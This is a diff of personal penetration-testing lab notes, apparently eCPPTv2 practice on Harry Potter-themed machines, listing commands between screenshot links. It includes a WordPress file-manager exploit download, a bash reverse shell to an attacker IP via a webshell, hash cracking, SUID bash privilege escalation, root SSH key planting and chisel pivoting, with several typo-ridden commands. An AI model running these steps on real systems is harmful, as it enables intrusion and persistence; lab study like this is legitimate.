@@ -1,65 +1,239 @@
-
+```java
+neofetch
+```
 ![[Pasted image 20230913162208.png]]
+```java
+sudo arp-scan -I eth0 --localnet
+```
 ![[Pasted image 20230913163101.png]]
-
+```java
+ping -c 192.168.153.153
+```
 ![[Pasted image 20230913162723.png]]
+```java
+mkdir eCPPTv2 && cd eCPPTv2 &&mkdir 192.168.153.153 && cd 192.168.153.153 cd 192.168.153.153 mkdir {scan,content,exploit} && ls && cd scan
+```
 ![[Pasted image 20230913162944.png]]
+```java
+sudo nmap -p- --opne -sS --min-rate 5000 -vvv -n -Pn 192.168.153.153 -oG allports 
+```
 ![[Pasted image 20230913163031.png]]
+```java
+sudo nmap -sCV -p22,80 192.168.153.153 -oN targeted
+```
 ![[Pasted image 20230913163307.png]]
+```java
+http://192.168.153.153
+```
 ![[Pasted image 20230913164416.png]]
+```java
+whatweb 192.168.153.153
+```
 ![[Pasted image 20230913164442.png]]
+```java
+gobuster dir -u http://192.168.153.153/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x http,php,txt
+```
 ![[Pasted image 20230913165515.png]]
+```java
+http://192.168.153.153/blog/
+```
 ![[Pasted image 20230913165540.png]]
 ![[Pasted image 20230913165954.png]]
+```java
+nano /ect/hosts
+```
 ![[Pasted image 20230913170623.png]]
 ![[Pasted image 20230913170943.png]]
+```java
+wget http://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
+```
 ![[Pasted image 20230914123050.png]]
+```java
+nano 2020-wp-file-manager-v67.py
+```
 ![[Pasted image 20230914123235.png]]
+```java
+python3 2020.wp-file-manager-v67.py http://192.168.153.153/blog/
+```
 ![[Pasted image 20230914123739.png]]
-
+```java
+192.168.153.153/blog/wp-content/plugings/wp-file-manager/lib/files/payloads.php?cmd=ip a
+```
 ![[Pasted image 20230914133029.png]]
+```java
+192.168.153.153/blog/wp-content/plugings/wp-file-manager/lib/files/payloads.php?cmd=bash -c "bash -i > %26 /dev/tcp/192.168.153.152/443 0>%261"
+```
 ![[Pasted image 20230914133342.png]]
+```java
+nc -nlvp 443
+```
 ![[Pasted image 20230914133403.png]]
+```java
+script /dev/null -c bash
+```
 ![[Pasted image 20230914133501.png]]
+```java
+stty raw -echo; fg
+```
 ![[Pasted image 20230914133547.png]]
-
+```java
+ls 
+shred -zun 10 -v payloads.php
+```
 ![[Pasted image 20230914134236.png]]
+```java
+ls
+cd hagrid98
+cat horcrux1.txt
+```
 ![[Pasted image 20230914134356.png]]
+```java
+echo base64 -d; echo
+```
 ![[Pasted image 20230914134836.png]]
-![[Pasted image 20230914135023.png]]
-![[Pasted image 20230914135139.png]]
+```java
+cat /etc/wordpress/config-default.php
+```
 ![[Pasted image 20230914135240.png]]
+```java
+mysql -uroot -p
+
+mySecr3tPass
+```
 ![[Pasted image 20230914135431.png]]
+```java
+show databases;
+```
 ![[Pasted image 20230914135844.png]]
+```java
+describe wp-users;
+```
 ![[Pasted image 20230914135946.png]]
+```java
+select * from wp_users;
+```
 ![[Pasted image 20230914140102.png]]
+```java
+john -w:/usr/share/wordlist/rockyou.txt hash
+```
 ![[Pasted image 20230914141452.png]]
+```java
+ssh hagrid98@192.168.153.153
+```
 ![[Pasted image 20230914141629.png]]
-![[Pasted image 20230914142323.png]]
+```java
+find \-user hagrid98 2>/dev/null
+```
 ![[Pasted image 20230914142351.png]]
+![[Pasted image 20230914142323.png]]
+```java
+ls 
+ls -la
+cat .backup.sh
+```
 ![[Pasted image 20230914142432.png]]
+```java
+chmod u+s /bin/bash
+```
 ![[Pasted image 20230914142705.png]]
+```java
+ls -la .backup.sh /bin/bash 
+```
 ![[Pasted image 20230914142916.png]]
+```java
+bash -p
+whoami
+cd /root/
+ls
+cat horcrux2.txt
+```
 ![[Pasted image 20230914143110.png]]
+```java
+echo base64 -d; echo
+```
 ![[Pasted image 20230914143207.png]]
+```java
+cd /root/
+ls -la
+cd .ssh/
+```
 ![[Pasted image 20231024105734.png]]
+```java
+ssh-keygen
+```
 ![[Pasted image 20231024105800.png]]
+```java
+cat ~/.ssh/id_ras.pub tr -d '\n'
+nano authorized_keys
+```
 ![[Pasted image 20231024112428.png]]
+```java
+cat authorized_keys 
+ssh root@192.168.153.153
+```
 ![[Pasted image 20231024112910.png]]
+```java
+#!/bin/bash
+for i in $(seq 1 254); do 
+ timeout 1 bash -c "ping -c 1 10.10.0.$i &/dev/null && echo "[+] HOST 10.10.0.$i - ACTIVE
+ done
+ wait
+```
 ![[Pasted image 20231024114904.png]]
-![[Pasted image 20231024114818.png]]![[Pasted image 20231024115515.png]]
+```java
+nano hostdiscovery.sh
+chmod +x hostdiscovery.sh -vvv
+./hostdiscovery.sh
+```
+![[Pasted image 20231024114818.png]]
+![[Pasted image 20231024115515.png]]
+```java
+mv /home/kali/Donwloads/chisel_1.9.1_linux_amd64.gz .
+gunzip chisel_1.9.1_linux_amd64.gz
+```
 ![[Pasted image 20231024120403.png]]
-![[Pasted image 20231024120439.png]]![[Pasted image 20231024120707.png]]
-![[Pasted image 20231024121524.png]]![[Pasted image 20231024123805.png]]
-![[Pasted image 20231024124235.png]]![[Pasted image 20231024124623.png]]
+```java
+chmod +x chisel
+```
+![[Pasted image 20231024120439.png]]
+```java
+python3 -m http.server 80
+wget http://192.168.153.152/chisel
+```
+![[Pasted image 20231024120707.png]]
+```java
+./chisel client 192.168.153.152:1234 R:socks
+./chisel server --reverse -p 1234
+```
+
+![[Pasted image 20231024123805.png]]
+```java
+nano /etc/proxychains4.conf
+socks5 127.0.0.1 1080
+```
+![[Pasted image 20231024124235.png]]!
+```java
+proxychains nmap -sT -Pn --top-ports 500 -open -T5 -v -n 10.10.0.128 2>/dev/null
+```
+![[Pasted image 20231024124623.png]]
+
 ![[Pasted image 20231024125132.png]]![[Pasted image 20231024125232.png]]
+```java
+gobuster dir -u http://10.10.0.128/ -w /usr/share/seclist/Discovery/Web_COntent/directory-list-2.3-medium.txt -t 20 -x http,php,txt --proxy socks5://127.0.0.1:1080
+```
 ![[Pasted image 20231024125621.png]]
 ![[Pasted image 20231024130037.png]]
 i will bd using our new HTTP3 server at html://quic.naguini.hogwarts for further comunications
 all debelopers are request to visit the server regulary for checking lastest announcements
 ![[Pasted image 20231024130103.png]]
 ![[Pasted image 20231024132419.png]]
+```java
+git clone --recursive https://github.com/cloudflare/quiche
+```
 ![[Pasted image 20231024132900.png]]
+```java
+
+```
 ![[Pasted image 20231024133702.png]]
 ![[Pasted image 20231024161121.png]]
 ![[Pasted image 20231024161404.png]]
@@ -179,3 +353,55 @@ s.close()
 
 ![[Pasted image 20231123154247.png]]
 ![[Pasted image 20231123154348.png]]
+![[Pasted image 20231127102822.png]]
+![[Pasted image 20231127103333.png]]
+![[Pasted image 20231127103526.png]]
+![[Pasted image 20231127104711.png]]
+![[Pasted image 20231127125211.png]]
+![[Pasted image 20231127125225.png]]
+![[Pasted image 20231127135620.png]]
+
+![[Pasted image 20231127135558.png]]
+
+![[Pasted image 20231127135729.png]]
+![[Pasted image 20231127135921.png]]
+
+You can enter into matrix as guest, with password k1ll0rXX
+
+Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.
+
+![[Pasted image 20231127140526.png]]
+![[Pasted image 20231127141803.png]]
+![[Pasted image 20231127142007.png]]
+![[Pasted image 20231127142333.png]]
+
+![[Pasted image 20231127142836.png]]
+![[Pasted image 20231129125855.png]]![[Pasted image 20231129125940.png]]
+![[Pasted image 20231129130108.png]]
+![[Pasted image 20231129130311.png]]![[Pasted image 20231130094313.png]]
+![[Pasted image 20231130104055.png]]
+![[Pasted image 20231130105844.png]]
+![[Pasted image 20231130105429.png]]![[Pasted image 20231130133629.png]]
+![[Pasted image 20231130133912.png]]
+![[Pasted image 20231130134037.png]]
+![[Pasted image 20231130134245.png]]
+![[Pasted image 20231130134824.png]]
+![[Pasted image 20231130140907.png]]
+![[Pasted image 20231130141134.png]]
+![[Pasted image 20231130141532.png]]
+![[Pasted image 20231130141547.png]]
+![[Pasted image 20231130141934.png]]
+![[Pasted image 20231130142148.png]]
+![[Pasted image 20231130142204.png]]
+![[Pasted image 20231130142420.png]]
+![[Pasted image 20231130142646.png]]
+![[Pasted image 20231130142656.png]]
+![[Pasted image 20231130143030.png]]
+![[Pasted image 20231130162711.png]]
+![[Pasted image 20231130163148.png]]
+![[Pasted image 20231130164805.png]]
+![[Pasted image 20231130164933.png]]
+![[Pasted image 20231130164955.png]]
+![[Pasted image 20231130165022.png]]
+![[Pasted image 20231130165112.png]]
+![[Pasted image 20231130165254.png]]
